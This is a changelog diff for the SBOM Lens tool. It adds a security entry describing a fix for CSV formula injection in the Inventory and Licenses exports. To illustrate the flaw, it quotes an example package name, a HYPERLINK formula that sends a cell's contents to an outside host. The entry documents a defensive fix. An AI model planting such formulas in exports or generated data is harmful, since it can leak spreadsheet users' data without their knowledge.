@@ -4,7 +4,23 @@ All notable changes to SBOM Lens. The format follows
 [Keep a Changelog](https://keepachangelog.com/en/1.1.0/); versions follow
 [SemVer](https://semver.org) (0.x: the API surface is the app itself).
 
-## [Unreleased]
+## [0.29.9] - 2026-10-16
+
+### Security
+- **CSV exports no longer hand a spreadsheet a formula from the SBOM** (OWASP
+  "CSV Injection"). The Inventory and Licenses exports wrote names, versions,
+  licenses, suppliers, purls, document names and VEX findings into the cells
+  as the documents stated them, so a package named
+  `=HYPERLINK("http://example.org/?"&A1,"click")` became a live formula when
+  the file was opened in Excel or LibreOffice Calc. A cell that starts with
+  `=`, `+`, `-` or `@`, with a tab, CR or LF, or with the full-width form of
+  one of the four now gets a leading single quote, which makes it text. npm
+  scopes such as `@types/node` keep their name: their pattern leaves no room
+  for a function call or an external reference. A value with a tab is now
+  quoted like one with a comma or semicolon, so a separator inside a value
+  cannot start a new cell. All other values export as before, and the JSON
+  exports were not affected. The OCM Lens 1.x flavor shares both exports and
+  gets the fix with its next build.
 
 ### Changed
 - **OCM Lens 1.x flavor: embedded SBOMs are extracted more carefully.** The
